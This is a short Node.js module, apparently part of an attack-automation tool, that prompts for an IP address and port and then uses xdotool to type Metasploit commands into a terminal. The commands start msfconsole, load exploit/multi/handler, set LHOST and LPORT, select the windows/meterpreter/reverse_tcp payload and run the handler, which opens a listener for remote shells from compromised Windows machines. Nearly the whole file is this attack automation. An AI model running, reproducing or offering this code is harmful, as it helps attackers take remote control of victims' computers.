exports.openConsole = (exec, inquirer) => {
  const enterKey = "xdotool key KP_Enter";

  inquirer
  //Collecting information from the user
    .prompt([
      {
        type: "input",
        message: "Please enter your IP address again",
        name: "ip",
      },
      {
        type: "input",
        message: "Please enter your preferred port again ",
        name: "port",
        default: 3333,
      },
    ])
    .then((answer) => {
      //Automates the user's commands in terminal
      const command =
        `xdotool type msfconsole && ` +
        `${enterKey}  && ` +
        `xdotool type "use exploit/multi/handler" && ` +
        `${enterKey}  && ` +
        `xdotool type "set LHOST ${answer.ip}" && ` +
        `${enterKey}  && ` +
        `xdotool type "set LPORT ${answer.port}" && ` +
        `${enterKey} && ` +
        `xdotool type "set payload windows/meterpreter/reverse_tcp" && ` +
        `${enterKey} && ` +
        `xdotool type "exploit" && ` +
        `${enterKey}`;

        //Error Handling
      exec(command, (error, stdout, stderr) => {
        console.log(stderr);
        console.log(stdout);
        if (error !== null) {
          console.log(error);
        }
      });
    });
};
